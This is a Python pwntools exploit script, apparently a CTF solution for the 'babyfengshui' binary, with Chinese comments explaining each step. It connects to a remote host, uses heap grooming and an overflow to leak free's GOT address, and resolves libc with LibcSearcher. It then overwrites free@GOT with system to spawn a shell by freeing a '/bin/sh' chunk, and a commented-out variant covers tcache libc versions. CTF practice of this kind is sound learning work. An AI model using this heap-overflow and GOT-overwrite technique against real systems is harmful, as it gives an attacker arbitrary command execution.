from pwn import *
from LibcSearcher import *

context.log_level = 'DEBUG'

p = remote('61.147.171.105', '61282')
# p = process('../file/babyfengshui')
elf = ELF('../file/babyfengshui')
# libc = ELF('./libc.so.6')给了libc可以直接加载

pause()

# 提交框架方便之后写payload，看着也简洁好看一点
def Add(size, length, text):
    p.sendlineafter(b"Action: ", b'0')
    p.sendlineafter(b"description: ", str(size).encode())
    p.sendlineafter(b"name: ", b'ffff')
    p.sendlineafter(b"length: ", str(length).encode())
    p.sendlineafter(b"text: ", text)

def Del(index):
    p.sendlineafter(b"Action: ", b'1')
    p.sendlineafter(b"index: ", str(index).encode())

def Display(index):
    p.sendlineafter(b"Action: ", b'2')
    p.sendlineafter(b"index: ", str(index).encode())

def Update(index, length, text):
    p.sendlineafter(b"Action: ", b'3')
    p.sendlineafter(b"index: ", str(index).encode())
    p.sendlineafter(b"length: ", str(length).encode())
    p.sendlineafter(b"text: ", text)

"""
没有Tcache的libc版本目标打入smallbin，申请大于0x80的chunk，free后合并成0x108大小的chunk
申请这块chunk，然后进行堆溢出时可以绕过检查
"""

Add(0x80, 0x80, b"hahaha") # 创建新用户0号
Add(0x80, 0x80, b"hahaha") # 创建新用户1号
Add(0x8, 0x8, b"/bin/sh\x00") # 创建新用户2号，申请空间大于0x8就行，也可以Add(0x80,0x8,"/bin/sh\x00")
Del(0) # 删除用户0

payload = b'a' * 0x198 + p32(elf.got['free'])
Add(0x108, 0x19C, payload) # 创建新用户3号。p32打包的地址长0x4，所以算上0x198个'a'，length长0x19C

Display(1) # 输出free的got表地址
p.recvuntil(b"description: ")
free_addr = u32(p.recv(4)) # free_got_address

libc = LibcSearcher("free", free_addr) # leak libc。 如果给了libc就不用用LibcSearcher了
offset = free_addr - libc.dump("free") # 如果给了libc就改成libc.symbols["free"]就行，下同
system_addr = offset + libc.dump("system")

Update(1, 4, p32(system_addr)) # 更新1号用户，修改got表。 p32打包成4位地址，所以length=4就行
Del(2) # 构成 system("/bin/sh") ，执行就拿到shell

# ---------------------------------------------------------------------------------

"""
存在Tcache的libc版本，通过精心构造的操作序列，使得某个用户description chunk地址和name chunk之间有其它用户的chunk
且description chunk在低地址处，name chunk在高地址处，就可以绕过检查进行堆溢出，覆盖关键的指针
"""

# Add(0x20, 0x20, b'aaaa') # 用户0
# Add(0x20, 0x20, b'aaaa') # 用户1
# Add(0x80, 0x80, b'aaaa') # 用户2
# Add(8, 8, b'/bin/sh\0') # 用户3
# Del(0)
# Del(2)

# payload = b'a' * (0x30 + 0x90 + 0x30) + p32(elf.got['free'])
# Add(0x20, len(payload), payload) # 用户4

# Display(1)
# p.recvuntil(b'description: ')
# free_addr = u32(p.recv(4))

# libc = LibcSearcher('free', free_addr)
# libc_base_addr = free_addr - libc.dump('free')
# system_addr = libc_base_addr + libc.dump('system')

# Update(1, 4, p32(system_addr))
# Del(3)

# ---------------------------------------------------------------------------------

# p.sendline("cat flag")
p.interactive()